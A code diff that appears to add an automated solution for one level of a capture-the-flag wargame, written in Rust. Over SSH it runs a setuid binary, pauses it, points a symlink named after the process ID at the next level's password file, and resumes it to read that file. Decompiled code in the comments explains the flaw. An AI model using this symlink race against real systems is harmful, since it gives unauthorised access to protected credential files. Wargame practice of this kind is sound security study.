@@ -259,14 +259,49 @@ fn behemoth3(password: &str) -> Result<String> {
 }
 
 fn behemoth4(password: &str) -> Result<String> {
+    // behemoth4 attempts to read a file in tmp with the name of its pid
+    // the code from ghidra is a bit like:
+    //   _Var1 = getpid();
+    //   sprintf(local_28,"/tmp/%d",_Var1);
+    //   __stream = fopen(local_28,"r");
+    //   if (__stream == (FILE *)0x0) {
+    //       puts("PID not found!");
+    //   }
+    //   else {
+    //       sleep(1);
+    //       puts("Finished sleeping, fgetcing");
+    //       while( true ) {
+    //       __c = fgetc(__stream);
+    //       if (__c == -1) break;
+    //       putchar(__c);
+    //       }
+    //       fclose(__stream);
+    //   }
+    // technique is to start the process, get its pid, and in parellel create a link to the next password file to be read
     
     let session = ssh_session("behemoth4", password)?;
     let mut channel = session.channel_session()?;
     create_shell(&mut channel)?;
 
     read_until(&mut channel, "behemoth4@gibson:~$ ")?;
+
+    println!("starting process in parallel and then pausing");
+    write_line(&mut channel, "/behemoth/behemoth4&")?;
+    write_line(&mut channel, "PID=$!")?;
+    write_line(&mut channel, "kill -STOP $PID")?;
+
+    println!("creating symlink and then restarting");
+    write_line(&mut channel, "ln -s /etc/behemoth_pass/behemoth5 /tmp/$PID")?;
+    write_line(&mut channel, "kill -CONT $PID")?;
     
-    
+    read_until(&mut channel, "behemoth4@gibson:~$ ")?;
+    read_until(&mut channel, "behemoth4@gibson:~$ ")?;
+    read_until(&mut channel, "behemoth4@gibson:~$ ")?;
+    read_until(&mut channel, "behemoth4@gibson:~$ ")?;
+    let result = read_until(&mut channel, "behemoth4@gibson:~$ ")?;
+    // let result: Vec<&str> = result.split("\n").collect();
+    // let result = result[result.len()-2].trim();
+    println!("retrieved behemoth5 pass '{result}'\n");
 
     Ok("result".to_string())
 }
